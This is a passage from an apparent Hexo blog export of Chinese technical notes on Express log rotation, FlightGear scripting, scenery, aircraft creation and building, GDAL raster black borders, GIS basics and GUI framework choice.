<h2 id="日志切割"><a href="#日志切割" class="headerlink" title="日志切割"></a>日志切割</h2><p>一个线上应用，如果所有的日志都落地到同一个本地文件，时间久了，文件会变得非常大，既影响性能，又不便于查看。这时候，就需要用到日志分割了。</p>
<p>借助file-stream-rotator插件，可以轻松完成日志分割的工作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var FileStreamRotator &#x3D; require(&#39;file-stream-rotator&#39;)</span><br><span class="line">var express &#x3D; require(&#39;express&#39;)</span><br><span class="line">var fs &#x3D; require(&#39;fs&#39;)</span><br><span class="line">var morgan &#x3D; require(&#39;morgan&#39;)</span><br><span class="line">var path &#x3D; require(&#39;path&#39;)</span><br><span class="line"></span><br><span class="line">var app &#x3D; express()</span><br><span class="line">var logDirectory &#x3D; path.join(__dirname, &#39;log&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ensure log directory exists</span><br><span class="line">fs.existsSync(logDirectory) || fs.mkdirSync(logDirectory)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; create a rotating write stream</span><br><span class="line">var accessLogStream &#x3D; FileStreamRotator.getStream(&#123;</span><br><span class="line">  date_format: &#39;YYYYMMDD&#39;,</span><br><span class="line">  filename: path.join(logDirectory, &#39;access-%DATE%.log&#39;),</span><br><span class="line">  frequency: &#39;daily&#39;,</span><br><span class="line">  verbose: false</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; setup the logger</span><br><span class="line">app.use(morgan(&#39;combined&#39;, &#123;stream: accessLogStream&#125;))</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;&#39;, function (req, res) &#123;</span><br><span class="line">  res.send(&#39;hello, world!&#39;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/chyingp/p/node-learning-guide-express-morgan.html" target="_blank" rel="noopener">Node 进阶：express 默认日志组件 morgan 从入门使用到源码剖析</a>,by 程序猿小卡.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>FlightGear的Nasal脚本语言学习笔记</title>
    <url>/2021/03/30/FlightGear%E7%9A%84Nasal%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>Nasal是FlightGear内建的脚本语言。 它最初是由安迪·罗斯（Andy Ross）为个人项目编写和开发的，于2003年11月被集成到FlightGear中，并且从那时起一直在不断地开发，改进和完善。 随着时间的流逝，它可能已成为FlightGear的最强大功能，并已用于创建各种各样的系统，从野火到控制显示单元。 </p>
<p>在FlightGear中，Nasal支持读取和写入内部属性，通过扩展功能访问内部数据，创建GUI对话框等等。注意到Nasal是一种与JavaScript语法类似的脚本语言，但是它能够与FlightGear之间进行双向交互，实现非常强大的功能，这主要是通过CppBind实现的。</p>
<h1 id="创建可点击的面板"><a href="#创建可点击的面板" class="headerlink" title="创建可点击的面板"></a>创建可点击的面板</h1><p>FlightGear中创建可点击的面板有两种方法：</p>
<ul>
<li>热点区域：在某个位置创建可点击表面</li>
<li>拾取：使一整个对象可以被点击</li>
</ul>
<h2 id="可点击面板的测试"><a href="#可点击面板的测试" class="headerlink" title="可点击面板的测试"></a>可点击面板的测试</h2><p>使用“Ctrl+C”可显示所有可点击的面板对象。</p>
<h1 id="属性浏览器"><a href="#属性浏览器" class="headerlink" title="属性浏览器"></a>属性浏览器</h1><p>属性树是FlightGear的神经系统，连接着FlightGear的各个子系统，是各个子系统之间交互的桥梁。因此，需要属性浏览器窗口查看各个属性的变化。打开属性浏览器的方式有两种：</p>
<ul>
<li>通过按键 Ctrl+/ 打开属性浏览器</li>
<li>通过主菜单 Debug &gt; Browse Internal Properties 打开属性浏览器</li>
</ul>
<h2 id="详细模式"><a href="#详细模式" class="headerlink" title="详细模式"></a>详细模式</h2><p>在属性浏览器窗口中，通过按键 Ctrl+. 可用来切换属性浏览器的详细模式（Verbose mode）。在详细模式下，可获得属性的额外信息，例如属性的类型、属性上侦听器的数量等。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://wiki.flightgear.org/Nasal_scripting_language" target="_blank" rel="noopener">Nasal scripting language</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Nasal_library#aircraftToCart.28.29" target="_blank" rel="noopener">Nasal library</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Bindings" target="_blank" rel="noopener">Bindings</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Category:Howto" target="_blank" rel="noopener">Category:Howto</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Howto:Animate_models" target="_blank" rel="noopener">Howto:Animate models</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Howto:Make_a_clickable_panel#Pick" target="_blank" rel="noopener">Howto:Make a clickable panel</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Howto:Creating_3D_instruments" target="_blank" rel="noopener">Howto:Creating 3D instruments</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Property_tree" target="_blank" rel="noopener">Property tree</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/PropertyList_XML_files" target="_blank" rel="noopener">PropertyList XML files</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Property_browser" target="_blank" rel="noopener">Property browser</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Effect_Framework" target="_blank" rel="noopener">Effect Framework</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Canvas_EFIS_Framework#new.28.29_3" target="_blank" rel="noopener">Canvas EFIS Framework</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Nasal/CppBind" target="_blank" rel="noopener">Nasal/CppBind</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Howto:Extend_Nasal" target="_blank" rel="noopener">Howto:Extend Nasal</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Canvas_ND_Framework" target="_blank" rel="noopener">Canvas ND Framework</a>,by flightgear.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>FlightGear安装飞机和场景的方法</title>
    <url>/2019/03/13/FlightGear%E5%AE%89%E8%A3%85%E9%A3%9E%E6%9C%BA%E5%92%8C%E5%9C%BA%E6%99%AF%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>FlightGear可安装额外的飞行器和地景。</p>
<h1 id="安装地景"><a href="#安装地景" class="headerlink" title="安装地景"></a>安装地景</h1><p>FlightGear的详细地景可以覆盖整个世界。默认的FlightGear安装包只包括旧金山周边一小块区域，因此想要飞到其他地方，得下载额外的地景。</p>
<p>每一块地景被打包成一个压缩包，每经纬度10度为一块。每一个压缩包以10×10经纬度命名，如w130n50.tgz。</p>
<p>下载FlightGear地景参考链接1。下载后的地景复制到$FG_ROOT/Scenery或者$FG_SCENERY下。</p>
<p>使用如下命令解压地景，将在$FG_ROOT/Scenery产生Objects和Terrain两个文件夹，分别为卫星地图和地形数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd $FG_ROOT&#x2F;Scenery</span><br><span class="line">tar -xvf e110n30.tgz</span><br><span class="line">rm e110n30.tgz</span><br></pre></td></tr></table></figure>

<h1 id="安装飞行器"><a href="#安装飞行器" class="headerlink" title="安装飞行器"></a>安装飞行器</h1><p>默认的FlightGear安装包只有少数几个飞行器，可以从参考链接2中获得大量的飞行器。</p>
<p>下载的飞行器复制到$FG_ROOT/Aircraft文件夹下。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://home.flightgear.org/download/scenery/" target="_blank" rel="noopener">下载FlightGear地景</a>， by flightgear.</li>
<li><a href="http://home.flightgear.org/download/download-aircraft/" target="_blank" rel="noopener">下载FlightGear飞行器</a>, by flightgear.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>GDAL处理地图栅格Tif黑边的方法</title>
    <url>/2019/10/20/GDAL%E5%A4%84%E7%90%86%E5%9C%B0%E5%9B%BE%E6%A0%85%E6%A0%BCTif%E9%BB%91%E8%BE%B9%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>通过地图下载软件LocaSpaceViewer下载卫星影像拼接成Tif文件后，会出现黑边问题。此外在Cesium中浏览瓦片地图会出现蓝色区域。下面即分析这两个问题出现的原因和解决方法。</p>
<h1 id="下载方法"><a href="#下载方法" class="headerlink" title="下载方法"></a>下载方法</h1><p>LocaSpaceViewer中可选择行政区域下载卫星影像，这种方式拼接后的tif文件必然会出现黑边，如图1所示。</p>
<p align="center">
    <img src="images/black1.jpg" width="60%" alt="黑边问题1"/>
</p>
<center>图1 黑边问题1</center>

<p>推荐在LocaSpaceViewer中以瓦片矩形区域下载卫星影像。具体方法为：</p>
<ol>
<li>在该链接<a href="https://www.maptiler.com/google-maps-coordinates-tile-bounds-projection/" target="_blank" rel="noopener">google-maps-coordinates-tile-bounds-projection</a>处查询瓦片的经纬度。</li>
<li>在LocaSpaceViewer中绘制矩形，并将矩形顶点的经纬度设置为待下载瓦片的经纬度。</li>
<li>在LocaSpaceViewer下载指定瓦片。</li>
</ol>
<p>该方法也可能会出现黑边，如图2所示。</p>
<p align="center">
    <img src="images/black2.jpg" width="60%" alt="黑边问题2"/>
</p>
<center>图1 黑边问题2</center>

<p>此外，将tif文件转换成标准瓦片后，在Cesium中浏览瓦片地图会出现蓝色区域，如图3所示。</p>
<p align="center">
    <img src="images/blue.jpg" width="90%" alt="蓝边问题"/>
</p>
<center>图3 蓝边问题</center>

<h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p>对问题1，下载不规则边界的地图时，地图下载软件不会自动填充白色或变成透明，所以导致黑边问题1的产生。</p>
<p>对问题2，产生原因目前不清楚，但因黑边的产生很有规则，所以解决方法会比较简单。</p>
<p>对问题3，产生原因是蓝边对应的瓦片不存在。</p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>对问题1，可采用链接<a href="http://blog.locaspace.cn:81/?p=971" target="_blank" rel="noopener">用LSV下载的高清地图去黑边教程</a>指明的方法去除黑边，但使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdal2tiles.py &lt;image&gt; &lt;tilesdir&gt;</span><br></pre></td></tr></table></figure>

<p>生成瓦片时会报错，因此建议采用瓦片矩形区域下载卫星影像，不要下载行政区域卫星地图。</p>
<p>对问题2，使用如下命令去除黑边：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看tif文件元数据信息</span><br><span class="line">gdalinfo 10.tif</span><br><span class="line">&#x2F;&#x2F; 根据黑边位置使用如下命令去除</span><br><span class="line">gdal_translate -srcwin 0 0 4096 4096 10.tif test.tif</span><br></pre></td></tr></table></figure>

<p>对问题3，使用LocaSpaceViewer下载指定级别指定区域的卫星影像即可。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2018/06/13/Cesium%E5%8D%AB%E6%98%9F%E5%9C%B0%E5%9B%BE%E5%92%8C%E9%AB%98%E7%A8%8B%E6%95%B0%E6%8D%AE%E5%88%87%E7%89%87%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Cesium卫星地图和高程数据切片经验总结</a>,by jackhuang.</li>
<li><a href="http://blog.locaspace.cn:81/?p=971" target="_blank" rel="noopener">用LSV下载的高清地图去黑边教程</a>,by LocaSpaceViewer.</li>
<li><a href="https://www.cnblogs.com/nygfcn1234/p/8876711.html" target="_blank" rel="noopener">cesium加载离线tms切片</a>,by nygfcn.</li>
<li><a href="https://www.cnblogs.com/mumu122GIS/p/11236694.html" target="_blank" rel="noopener">python gdal安装与简单使用</a>,by mumu122.</li>
<li><a href="https://zhuanlan.zhihu.com/p/141226948" target="_blank" rel="noopener">windows10 环境中安装GDAL及其python绑定</a>,by 蔚蓝小栈.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title>GIS数据基本概念解读</title>
    <url>/2023/02/02/GIS%E6%95%B0%E6%8D%AE%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<p>GIS栅格和矢量数据组织及服务的基本概念可以参考<a href="https://zhuanlan.zhihu.com/p/102923131" target="_blank" rel="noopener">聊聊GIS数据的四个分层与GIS服务</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/102923131" target="_blank" rel="noopener">聊聊GIS数据的四个分层与GIS服务</a>,by 为名.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title>FlightGear飞行模拟器中创建新飞机的方法</title>
    <url>/2019/03/17/FlightGear%E9%A3%9E%E8%A1%8C%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%AD%E5%88%9B%E5%BB%BA%E6%96%B0%E9%A3%9E%E6%9C%BA%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>FlightGear中创建新飞机粗略地分成四步：创建飞机的3D模型，创建飞机的飞行动力学模型，创建飞机操作动画，实现飞机各子系统。具体而言，又可分成两个主要的开发领域：飞行动力学模型开发和飞机3D模型开发。</p>
<h1 id="飞机3D模型开发"><a href="#飞机3D模型开发" class="headerlink" title="飞机3D模型开发"></a>飞机3D模型开发</h1><p>主要包括飞机外形、驾驶舱的3D模型开发，为飞行动力学模型设计的动画，声音等。</p>
<h2 id="加载飞机模型"><a href="#加载飞机模型" class="headerlink" title="加载飞机模型"></a>加载飞机模型</h2><p>通过OpenSceneGraph，FlightGear支持许多不同的3D文件格式，包括VRML1，AC3D，DXF等等。 但是，.ac是大多数FG模型中使用的标准。</p>
<p>主FlightGear属性树中的属性/ sim / model / path控制将加载的模型; 它需要一个字符串值，从$ FG ROOT给出模型的相对路径。</p>
<p>加载新模型的最简单方法是使用–prop：命令行选项在启动时设置属性; 例如，要使用已安装在$ FG_ROOT / Models / my-cessna.ac中的3D飞机模型，您可以像这样调用FlightGear（在类Unix系统下）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fgfs --prop:&#x2F;sim&#x2F;model&#x2F;path&#x3D;Models&#x2F;my-cessna.ac</span><br></pre></td></tr></table></figure>

<p>（注意：通常模型使用的所有纹理必须出现在同一目录中。如果my-cessna.ac使用纹理cessna01.rgb和cessna02.rgb，你还应该在$ FG_ROOT / Models /中安装这些纹理。</p>
<p>如果要将3D模型永久设置为飞机的默认值而不是在命令行上指定，则需要编辑飞机设置文件。 在$ FG_ROOT / Aircraft /目录中有一系列以-set.xml结尾的文件，例如c172-set.xml，dc3-yasim-set.xml和beech99-uiuc-set.xml。 当您使用–aircraft选项启动FlightGear时，它会从其中一个文件中读取属性; 例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fgfs --aircraft&#x3D;dc3-yasim</span><br></pre></td></tr></table></figure>

<p>将$ FG_ROOT / Aircraft / dc3-yasim-set.xml中的属性加载到主FlightGear属性树中。 这些文件与$ FG_ROOT / preferences.xml和FlightGear保存文件具有相同的XML属性列表格式。 对于任何单机类型，可能有许多具有不同启动条件，声音，面板，3D模型等的XML文件，因此您最好复制现有的，重命名它，然后更改模型内部路径元素内的值SIM卡：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;PropertyList&gt;</span><br><span class="line">&lt;sim&gt;</span><br><span class="line"> &lt;model&gt;</span><br><span class="line">  &lt;path&gt;Models&#x2F;my-cessna.ac&lt;&#x2F;path&gt;</span><br><span class="line">  &lt;texture-path&gt;.&#x2F;Textures&lt;&#x2F;texture-path&gt;</span><br><span class="line"> &lt;&#x2F;model&gt;</span><br><span class="line">&lt;&#x2F;sim&gt;</span><br><span class="line">&lt;&#x2F;PropertyList&gt;</span><br></pre></td></tr></table></figure>

<h1 id="飞机动力学模型开发"><a href="#飞机动力学模型开发" class="headerlink" title="飞机动力学模型开发"></a>飞机动力学模型开发</h1><p>FlightGear主要使用JSBSim 和 YASim两个开源的飞行动力学模型，也有极少数使用UIUC飞行动力学模型。</p>
<h2 id="YASim"><a href="#YASim" class="headerlink" title="YASim"></a>YASim</h2><p>FDM是控制模拟器内飞行物理的数学模型。 物理3D飞机模型与飞行动力学无关 - 实质上它只是一张要看的图片。 这是FDM决定模型如何飞行。</p>
<p>为何选择YASim？ YASim使用飞机的几何形状来生成基本飞行特征。 虽然这表明了一种“现实的”或开箱即用的方法，但在获得接近现实主义的结果之前，这只是一种粗略的近似，需要进行大量的调整。 如果您的飞机有稳定的飞行数据，例如风洞数据，或者您希望最终生成超逼真的模拟，那么JSBSim可能是更好的方法。 如果你缺乏这样的数据但是知道飞机的几何形状并且能够获得与真实飞行员相同的飞行特性和限制，那么YASim可以提供足以满足大多数模拟需求的解决方案。</p>
<h2 id="JSBSim"><a href="#JSBSim" class="headerlink" title="JSBSim"></a>JSBSim</h2><p>JSBSim是一个开源飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。 它也可以从一个小型独立程序调用，以创建批处理模拟工具。 JSBSim自1996年以来一直在开发和使用，并且已经构建在当今使用的所有最流行的平台上，包括运行Linux，Macintosh和Microsoft Windows操作系统的平台。 JSBSim是用C ++编写的，使用XML配置文件。</p>
<h1 id="飞机模型开发规范说明"><a href="#飞机模型开发规范说明" class="headerlink" title="飞机模型开发规范说明"></a>飞机模型开发规范说明</h1><h2 id="规则和指导"><a href="#规则和指导" class="headerlink" title="规则和指导"></a>规则和指导</h2><ul>
<li><p>FlightGear中的所有图像的大小应为2的幂（例如64 * 64,128 * 256或16 * 1024）。大多数计算机无法处理大于4096像素的纹理。从FlightGear 1.9开始，图像不再需要以.rgb格式保存。现在.png是FlightGear开发人员中最常用的.png。</p>
</li>
<li><p>请注意，我们在代码中使用空格，一些开发人员使用相应的选项卡，以使我们的代码易于（呃）阅读。每一行开始一个新标签，我们按空格键一次，这样你就可以得到一种楼梯。只要您在所有文件中始终如一地使用它，使用何种方法并不重要。但是JSBSim FDM使用的XML文件必须使用空格而不是制表符。</p>
</li>
<li><p>在大多数操作系统上，文件名和目录区分大小写。 Windows不区分大小写，因此当您在Windows计算机上进行开发时，您不会发现任何问题。在其他操作系统上，“波音”和“波音”之间存在差异。由于FlightGear用于多个平台，请确保您的代码正确使用大写字母！</p>
</li>
</ul>
<h2 id="目录结构说明"><a href="#目录结构说明" class="headerlink" title="目录结构说明"></a>目录结构说明</h2><p>创建一个新的飞机模型，应该在$FG_ROOT/Aircraft/路径下创建文件夹，以飞机名称命名。例如在$FG_ROOT/Aircraft/路径下创建一个Su30的文件夹，开始构建Su30飞机模型。在飞机根目录下，其目录结构如下：</p>
<ul>
<li>-set.xml file</li>
</ul>
<p>描述飞机依赖关系的最重要文件是aircraft-set.xml文件。</p>
<ul>
<li>.xml file (FDM)</li>
</ul>
<p>该文件包含飞机的整个（或部分）飞行动力学模型。有YASim、JSBSim、UIUC三种不同的飞行动力学模型，他们都有自己的优缺点。</p>
<p>由于数据有限，YASim通常被认为是最好的方式。 当您访问真实的风洞数据和/或需要更多灵活性时，JSBSim可能是更好的选择。</p>
<ul>
<li>Engines/ directory</li>
</ul>
<p>仅适用于JSBSim飞机。 在此目录中，存储引擎和推进器/螺旋桨文件。</p>
<ul>
<li>Models/ directory</li>
</ul>
<p>该目录包含所有与模型相关的文件; 例如纹理，模型和动画文件（.xml）。 在-set.xml文件中，我们将路径设置为一个.xml文件。 该文件应链接（间接）到飞机所需的每个其他模型文件（包括可能的3D驾驶舱）。 整个飞机可以建模为一个文件，但大多数开发人员更喜欢拆分。 例如，驾驶舱可以由几个文件构建，每个文件只存在一个仪器或面板。 这样很容易（重新）移动飞机的某些部件。 您可以像这样设置模型文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;PropertyList&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;path&gt;Aircraft.ac&lt;&#x2F;path&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;model&gt;</span><br><span class="line">  &lt;name&gt;Cockpit&lt;&#x2F;name&gt;</span><br><span class="line">  &lt;path&gt;Aircraft&#x2F;...&#x2F;Models&#x2F;cockpit.xml&lt;&#x2F;path&gt;</span><br><span class="line">  &lt;offsets&gt;</span><br><span class="line">   &lt;x-m&gt; -5.25&lt;&#x2F;x-m&gt;</span><br><span class="line">   &lt;y-m&gt;  0.00&lt;&#x2F;y-m&gt;</span><br><span class="line">   &lt;z-m&gt;  1.30&lt;&#x2F;z-m&gt;</span><br><span class="line">  &lt;&#x2F;offsets&gt;</span><br><span class="line"> &lt;&#x2F;model&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;animation&gt;</span><br><span class="line">  &lt;type&gt;rotate&lt;&#x2F;type&gt;</span><br><span class="line">  &lt;object-name&gt;AileronLeft&lt;&#x2F;object-name&gt;</span><br><span class="line">  &lt;property&gt;&#x2F;controls&#x2F;flight&#x2F;aileron&lt;&#x2F;property&gt;</span><br><span class="line">  &lt;factor&gt;-65&lt;&#x2F;factor&gt;</span><br><span class="line">  &lt;center&gt;</span><br><span class="line">   &lt;x-m&gt; 2.09&lt;&#x2F;x-m&gt;</span><br><span class="line">   &lt;y-m&gt;-5.50&lt;&#x2F;y-m&gt;</span><br><span class="line">   &lt;z-m&gt;-1.50&lt;&#x2F;z-m&gt;</span><br><span class="line">  &lt;&#x2F;center&gt;</span><br><span class="line">  &lt;axis&gt;</span><br><span class="line">   &lt;x&gt;1&lt;&#x2F;x&gt;</span><br><span class="line">   &lt;y&gt;0&lt;&#x2F;y&gt;</span><br><span class="line">   &lt;z&gt;0&lt;&#x2F;z&gt;</span><br><span class="line">  &lt;&#x2F;axis&gt;</span><br><span class="line"> &lt;&#x2F;animation&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;&#x2F;PropertyList&gt;</span><br></pre></td></tr></table></figure>

<p>cockpit.xml文件可以包含相似结构，所有工具都是单独的模型。 模型的数量不受限制，动画的数量也不限。</p>
<ul>
<li>Nasal/ directory</li>
</ul>
<p>所有针对飞机的Nasal脚本都放在此目录中，但某些系统或仪器特定的Nasal脚本除外。 如果某个Nasal脚本对所有飞机都有用（例如天气或多人相关），它可以放在$ FG_ROOT / Nasal目录中。 可以在$ FG_ROOT / Aircraft / Generic目录中找到可在多架飞机上使用的Nasal脚本（例如空中加油）。</p>
<ul>
<li>Sounds/ directory</li>
</ul>
<p>声音对于增加你实际进入模拟的感觉非常重要。 在此目录中，存储了特定于飞行器的所有声音文件。 可以在多个飞机上使用的声音（例如，点击开关或雷声）可在$ FG_ROOT / Sounds目录中找到。</p>
<ul>
<li>Tutorials/ directory</li>
</ul>
<p>FlightGears教程系统是学习如何启动飞机引擎等的有用功能。 它允许您创建一个分步教程，指导用户完成某个过程。 它甚至可以指示应按下哪些开关！</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://wiki.flightgear.org/Howto:Make_an_aircraft" target="_blank" rel="noopener">Howto:Make an aircraft</a>,by flightgear home.</li>
<li><a href="http://wiki.flightgear.org/Howto:3D_Aircraft_Models" target="_blank" rel="noopener">Howto:3D Aircraft Models</a>,by flightgear home.</li>
<li><a href="http://wiki.flightgear.org/Howto:Animate_models" target="_blank" rel="noopener">Howto:Animate models</a>,by flightgear home.</li>
<li><a href="http://wiki.flightgear.org/YASim" target="_blank" rel="noopener">YASim</a>,by flightgear home.</li>
<li><a href="http://wiki.flightgear.org/JSBSim" target="_blank" rel="noopener">JSBSim</a>,by flightgear home.</li>
<li><a href="http://wiki.flightgear.org/Portal:Developer/Aircraft" target="_blank" rel="noopener">Welcome to the aircraft developer portal!</a>,by flightgear.</li>
<li><a href="https://wiki.flightgear.org/Howto:Creating_3D_instruments" target="_blank" rel="noopener">Howto:Creating 3D instruments</a>,by flightgear.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>Flightgear在Linux/Debian中的下载编译安装教程</title>
    <url>/2019/03/08/Flightgear%E5%9C%A8Linux-Debian%E4%B8%AD%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h1><p>使用如下脚本在Linux/Debian操作系统下从源代码构建开源飞行模拟器FlightGear.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd  &lt;your working directory for building FlightGear&gt;</span><br><span class="line">wget -O download_and_compile.sh  http:&#x2F;&#x2F;sourceforge.net&#x2F;p&#x2F;flightgear&#x2F;fgmeta&#x2F;ci&#x2F;next&#x2F;tree&#x2F;download_and_compile.sh?format&#x3D;raw</span><br><span class="line">chmod +x download_and_compile.sh</span><br><span class="line">mkdir -p stable</span><br><span class="line">mkdir -p next</span><br><span class="line">cd stable</span><br><span class="line">..&#x2F;download_and_compile.sh -s</span><br><span class="line">cd ..&#x2F;next</span><br><span class="line">..&#x2F;download_and_compile.sh -p n</span><br></pre></td></tr></table></figure>

<p>需要注意的是，该脚本git clone fgdata时超过1G时就会报错退出，解决方案见链接4。</p>
<p>此外，如果之前安装过FlightGear的旧版本，编译过程也有可能报错，清理之前旧版本之后即可解决问题。</p>
<h1 id="启动模拟器"><a href="#启动模拟器" class="headerlink" title="启动模拟器"></a>启动模拟器</h1><p>启动FlightGear命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &lt;your working directory for building FlightGear&gt;</span><br><span class="line">cd stable</span><br><span class="line">.&#x2F;run_fgfs.sh</span><br></pre></td></tr></table></figure>

<h1 id="fgfs常用选项"><a href="#fgfs常用选项" class="headerlink" title="fgfs常用选项"></a>fgfs常用选项</h1><p>fgfs为flightgear的飞行模拟器主程序，在命令行中输入fgfs –launcher即可打开启动器，选择飞机、位置等配置，然后开始模拟飞行。下面介绍fgfs的一些常用选项。</p>
<ul>
<li><p>–launcher</p>
<p>  打开启动器。</p>
</li>
<li><p>–fg-root=path</p>
<p>  告诉flightgear到path下寻找数据文件，如飞机、地景等。</p>
</li>
<li><p>–fg-scenery=path</p>
<p>  告诉flightgear到path下寻找地景文件。</p>
</li>
<li><p>–fg-aircraft=path</p>
<p>  告诉flightgear到path下寻找飞机文件。</p>
</li>
<li><p>–language=code</p>
<p>  指定会话语音， 例如 pl, nl, it, fr, en, de。</p>
</li>
<li><p>–aircraft= 飞行器</p>
<p>  载入特定飞行器。</p>
</li>
<li><p>–show-aircraft</p>
<p>  打印可用的飞行器列表。</p>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://wiki.flightgear.org/Howto:Get_Local_Copies_of_Flightgear_Source_Code" target="_blank" rel="noopener">Howto:Get Local Copies of Flightgear Source Code</a>,by flightgear wiki.</li>
<li><a href="http://wiki.flightgear.org/Scripted_Compilation_on_Linux_Debian/Ubuntu" target="_blank" rel="noopener">Scripted Compilation on Linux Debian/Ubuntu</a>, by flightgear wiki.</li>
<li><a href="http://wiki.flightgear.org/Building_FlightGear" target="_blank" rel="noopener">Building FlightGear</a>,by flightgear wiki.</li>
<li><a href="https://huangwang.github.io/2019/03/09/Git-Clone大项目超过1G失败解决方案/">Git_Clone大项目超过1G失败解决方案</a>,by jack huang.</li>
<li><a href="http://wiki.flightgear.org/Building_using_CMake_-_Windows" target="_blank" rel="noopener">Building using CMake - Windows</a>,by flightgear.</li>
<li><a href="https://blog.csdn.net/inter_peng/article/details/53933206" target="_blank" rel="noopener">Visual Studio之RelWithDebInfo模式，“被忽视”的编译模式</a>,by inter_peng.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>GUI桌面开发框架选择与对比</title>
    <url>/2021/04/28/GUI%E6%A1%8C%E9%9D%A2%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E9%80%89%E6%8B%A9%E4%B8%8E%E5%AF%B9%E6%AF%94/</url>
    <content><![CDATA[<p>当前桌面GUI程序开发有很多框架，都有各自的优缺点。结合自身需求，最终选择QT Widgets进行桌面GUI程序开发。</p>
<h1 id="GUI框架对比"><a href="#GUI框架对比" class="headerlink" title="GUI框架对比"></a>GUI框架对比</h1><p align="center">
    <img src="images/GUI库对比.jpg" width="100%" alt="GUI框架对比"/>
</p>
<center>图1 GUI框架对比</center>

<p>当前QT GUI开发有两种方案，一种是使用QT Widgets技术，另一种是使用QT Quick技术。如果从技术成熟度和开发效率角度考虑，可以考虑采用QT Widgets技术进行传统桌面程序开发。</p>
